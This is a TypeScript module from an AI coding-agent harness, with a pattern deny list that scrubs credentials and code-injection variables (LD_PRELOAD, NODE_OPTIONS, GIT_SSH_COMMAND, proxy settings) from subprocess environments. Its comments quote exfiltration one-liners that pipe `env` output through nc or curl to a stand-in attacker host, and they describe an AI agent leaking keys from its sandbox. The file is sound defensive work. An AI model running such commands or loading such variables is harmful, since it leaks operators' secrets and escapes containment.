// Strip credentials from the env handed to a subprocess. A model can
// trivially exfiltrate via `bash("env | grep KEY | nc attacker ...")`
// (or `bash_background` + `bash_output`) if we don't filter. This is
// not a substitute for the M3+ sandbox — it just closes the obvious
// leak path that requires zero cleverness.
//
// Matches by name, case-insensitive. Patterns cover provider keys
// (Anthropic / OpenAI / Google / Gemini), AWS creds, GitHub & npm
// tokens, generic `*_KEY` / `*_TOKEN` / `*_SECRET` / `*_PASSWORD` /
// `*_PASS` suffixes. False positives (e.g. a legit `BUILD_TOKEN`)
// are acceptable — scripts that genuinely need a redacted variable
// can pass it via inline shell (`SOMEKEY=value command`) or via the
// future explicit-env tool option (not implemented yet).
const SCRUB_PATTERNS: readonly RegExp[] = [
  /_API_KEY$/i,
  /_TOKEN$/i,
  /_SECRET$/i,
  /_PASSWORD$/i,
  /_PASS$/i,
  // Slice 162 (review — env scrub expansion). Generic credential-
  // shape suffixes that pre-slice escaped the denylist. The 5-axis
  // security review flagged ad-hoc credential vars (VAULT_ADDR,
  // BW_SESSION, etc.) reaching sandboxless macOS / host-profile
  // paths via `env | base64 | curl attacker.com`. The macOS
  // clearenv parity wire (slice 162 part 1) closes the sandboxed
  // path; these patterns close the host / degraded path.
  /_KEY$/i, // *_KEY: PRIVATE_KEY, SECRET_KEY, ENCRYPTION_KEY, ...
  /_AUTH$/i, // *_AUTH: REGISTRY_AUTH, DOCKER_AUTH, ...
  /_BEARER$/i, // *_BEARER: BEARER tokens
  /_CRED$/i, // *_CRED: GCLOUD_CRED, AWS_CRED, ...
  /_CREDS$/i, // plural variant
  /_PRIVATE_KEY$/i, // explicit (caught by _KEY too; pinned for clarity)
  /_SESSION$/i, // *_SESSION: BW_SESSION, AUTH_SESSION, generic session tokens
  /_COOKIE$/i, // *_COOKIE: auth cookies stored in env (rare but seen)
  /^AWS_/i,
  /^OPENAI_/i,
  /^ANTHROPIC_/i,
  /^GOOGLE_API_KEY$/i,
  /^GEMINI_API_KEY$/i,
  /^GITHUB_TOKEN$/i,
  /^GH_TOKEN$/i,
  /^NPM_TOKEN$/i,
  /^DOCKER_PASSWORD$/i,
  // Slice 162 (review — env scrub expansion): service-specific
  // credential vars whose names don't end in the canonical suffixes.
  /^VAULT_/i, // HashiCorp Vault: VAULT_TOKEN, VAULT_ADDR (server URL is also sensitive — leaks infra topology)
  /^BW_/, // Bitwarden CLI: BW_SESSION (session id), BW_CLIENTID, BW_CLIENTSECRET
  /^LPASS_/i, // LastPass CLI: LPASS_PROCESS_PID, LPASS_AGENT_TIMEOUT
  /^LASTPASS_/i, // LASTPASS_USER (PII; also adjacent to credential auth)
  /^OP_CONNECT_/i, // 1Password Connect: OP_CONNECT_TOKEN, OP_CONNECT_HOST
  /^DOPPLER_TOKEN$/i, // Doppler secrets manager
  /^INFISICAL_TOKEN$/i, // Infisical secrets manager
  /^TWILIO_ACCOUNT_SID$/i, // Twilio: account SID is half the auth pair
  // Slice 128 (R4 P1): credential / session vars that DON'T match
  // the standard `_TOKEN`/`_SECRET`/`_KEY`/`_PASSWORD` suffix
  // patterns. Each is documented to carry a credential or session
  // socket path that the LLM could use to sign/authenticate to a
  // remote service from inside the sandbox.
  /^SSH_AUTH_SOCK$/, // ssh-agent socket — sandbox can ssh-add -l + sign
  /^GPG_AGENT_INFO$/, // gpg-agent socket
  /^GNUPGHOME$/, // gpg dir override
  /^KUBECONFIG$/, // kubernetes credentials file path
  /^DOCKER_AUTH_CONFIG$/, // base64 registry creds
  /^OP_SESSION_/i, // 1Password CLI session tokens (per-account)
  /^CLOUDSDK_/i, // gcloud SDK config + auth tokens
  // Slice 129 (R5 P0-3): git config-via-env. GIT_CONFIG_PARAMETERS
  // is a semicolon-separated `key='value';...` list git applies as
  // if each pair were `-c key=value`. GIT_CONFIG_COUNT + indexed
  // GIT_CONFIG_KEY_n / GIT_CONFIG_VALUE_n is the newer (git ≥ 2.31)
  // structured form. Both bypass slice 128's `-c` argv refuse —
  // attacker uses ENV instead of flag. GIT_SSH / GIT_EDITOR /
  // GIT_PAGER / GIT_PROXY_COMMAND / GIT_EXTERNAL_DIFF all execute
  // attacker-controlled commands during normal git operations.
  /^GIT_CONFIG_/i,
  /^GIT_SSH$/i,
  /^GIT_SSH_COMMAND$/i,
  /^GIT_EDITOR$/i,
  /^GIT_PAGER$/i,
  /^GIT_PROXY_COMMAND$/i,
  /^GIT_EXTERNAL_DIFF$/i,
  /^GIT_TEMPLATE_DIR$/i, // templates can carry hooks
  // Slice 142 (review minor): dynamic linker injection. An LLM-
  // driven bash inherits whatever the operator's parent shell
  // had; if a malicious .bashrc set `LD_PRELOAD=/tmp/x.so`, every
  // wrapped exec loads the rogue library and bypasses syscall-
  // level sandbox protections (the .so runs as the process's own
  // library code). Same threat shape for macOS DYLD_*. Defense-
  // in-depth: scrub at every spawn boundary so the sandboxed
  // process can't inherit + can't set them either. Plus
  // SUDO_ASKPASS (could run a credential-prompting helper of
  // attacker's choice during a sudo invocation).
  /^LD_PRELOAD$/,
  /^LD_LIBRARY_PATH$/,
  /^LD_AUDIT$/,
  /^DYLD_INSERT_LIBRARIES$/,
  /^DYLD_FALLBACK_LIBRARY_PATH$/,
  /^DYLD_LIBRARY_PATH$/,
  /^SUDO_ASKPASS$/,
  // Slice 146 (review minor): application-runtime injection points.
  // Slice 142 closed the dynamic-linker surface; these are the
  // same threat shape one level up — language runtime startup
  // hooks that execute attacker-controlled code BEFORE the user
  // script runs.
  //
  //   NODE_OPTIONS         `--require /tmp/x.js` runs in every
  //                        Node child inheriting the env.
  //   PYTHONPATH           injects modules into Python's import
  //                        search path; `usercustomize.py` /
  //                        `sitecustomize.py` then run automatically.
  //   PYTHONSTARTUP        path to a script Python runs at REPL
  //                        startup; abused by interactive python -i.
  //   PYTHONUSERBASE       relocates user-site packages — a copy
  //                        of `usercustomize.py` lands here.
  //   RUBYOPT / RUBYLIB    Ruby equivalent of NODE_OPTIONS /
  //                        PYTHONPATH (`-rmodule` autorequires).
  //   PERL5OPT / PERL5LIB / PERL5DB
  //                        Perl injection (`-d:Module=arg` runs
  //                        Module->import('arg') in debugger).
  //   BASH_ENV             bash auto-sources this file at every
  //                        non-interactive shell start — exactly
  //                        the shape `bash -c "..."` takes.
  //   ENV                  sh/ksh equivalent of BASH_ENV.
  //   PROMPT_COMMAND       bash evaluates this on every prompt
  //                        in interactive shells (lower threat
  //                        for our non-interactive use, but
  //                        defense in depth).
  //   BASH_FUNC_*          Shellshock surface — bash imports
  //                        functions from env via this prefix on
  //                        old enough bash; defending even on
  //                        patched systems is cheap.
  //
  // Plus proxy + dbus + XDG runtime — these don't run code on
  // their own but redirect / hand the LLM a privileged channel:
  //   HTTP_PROXY / HTTPS_PROXY / ALL_PROXY
  //                        any HTTP-aware tool the sandbox spawns
  //                        (curl, wget, fetch APIs) honors these
  //                        and redirects all egress through
  //                        attacker.example.com — MITM the
  //                        sandbox's network on a cwd-rw-net
  //                        profile. Case-insensitive: lowercase
  //                        `http_proxy` is the canonical curl form.
  //   DBUS_SESSION_BUS_ADDRESS
  //                        path to the operator's session DBus
  //                        socket. A sandboxed process can ask
  //                        secret-service / org.freedesktop.systemd1
  //                        / gnome-keyring to act on its behalf.
  //   XDG_RUNTIME_DIR      `/run/user/<uid>` typically — holds
  //                        UNIX sockets for active user services
  //                        (gpg-agent, ssh-agent variants, etc.).
  /^NODE_OPTIONS$/,
  /^PYTHONPATH$/,
  /^PYTHONSTARTUP$/,
  /^PYTHONUSERBASE$/,
  /^RUBYOPT$/,
  /^RUBYLIB$/,
  /^PERL5OPT$/,
  /^PERL5LIB$/,
  /^PERL5DB$/,
  /^BASH_ENV$/,
  /^ENV$/,
  /^PROMPT_COMMAND$/,
  /^BASH_FUNC_/,
  /^HTTP_PROXY$/i,
  /^HTTPS_PROXY$/i,
  /^ALL_PROXY$/i,
  /^DBUS_SESSION_BUS_ADDRESS$/,
  /^XDG_RUNTIME_DIR$/,
];

// Provider API-key env vars. They DO match SCRUB_PATTERNS (and must — a
// sandboxed bash must never see them), but a subagent CHILD *process* needs
// its provider key to talk to the model it was assigned, or it dies
// "API key required" before running a single step. The subagent spawn
// passes these via `scrubEnv(env, { keep })`; every other credential stays
// stripped. The key stays on the child's `process.env` for the lifetime of
// the run, so the invariant that protects it is: EVERY subprocess the child
// spawns must receive an explicitly-shaped env, never raw `process.env`
// inheritance. That holds across the surface —
//   - bash broker / bg manager → `scrubEnv(process.env)`,
//   - git (checkpoints, worktrees, memory) → `safeGitEnv()` allowlist,
//   - hooks → `buildHookEnv` allowlist,
//   - grep's ripgrep → `buildGrepSpawnEnv` → `scrubEnv(process.env)`,
//   - sandboxed tools → bwrap `--clearenv` / macOS `env -i` at the boundary.
// so the key reaches only the child's own HTTP call to the provider, never a
// subprocess. A new spawn site that inherits the raw env would re-open the
// leak — keep it on this list. Mirror the adapters in src/providers/*/index.ts.
export const PROVIDER_API_KEY_VARS: readonly string[] = [
  'ANTHROPIC_API_KEY',
  'OPENAI_API_KEY',
  'GOOGLE_API_KEY',
  'GEMINI_API_KEY',
];

// Returns a defensive copy with credential-like vars removed. Undefined
// values (NodeJS.ProcessEnv allows them) are dropped; the result is a
// strict Record<string, string> ready for `Bun.spawn({ env })`.
//
// Used by `bash` (synchronous) and the bg `manager.spawn` (background).
// Both reach this layer before kernel-level execve sees the env, so a
// process spawned through either tool sees the sanitized environment
// regardless of category — uniform protection at the boundary.
//
// `opts.keep` is an allowlist of var names preserved even when they match a
// scrub pattern — used ONLY by the subagent spawn for provider keys (see
// PROVIDER_API_KEY_VARS). It never invents values: a kept var still has to
// be present in `env`.
export const scrubEnv = (
  env: NodeJS.ProcessEnv,
  opts?: { keep?: readonly string[] },
): Record<string, string> => {
  const keep = opts?.keep !== undefined ? new Set(opts.keep) : undefined;
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(env)) {
    if (v === undefined) continue;
    if (keep?.has(k) !== true && SCRUB_PATTERNS.some((p) => p.test(k))) continue;
    out[k] = v;
  }
  return out;
};
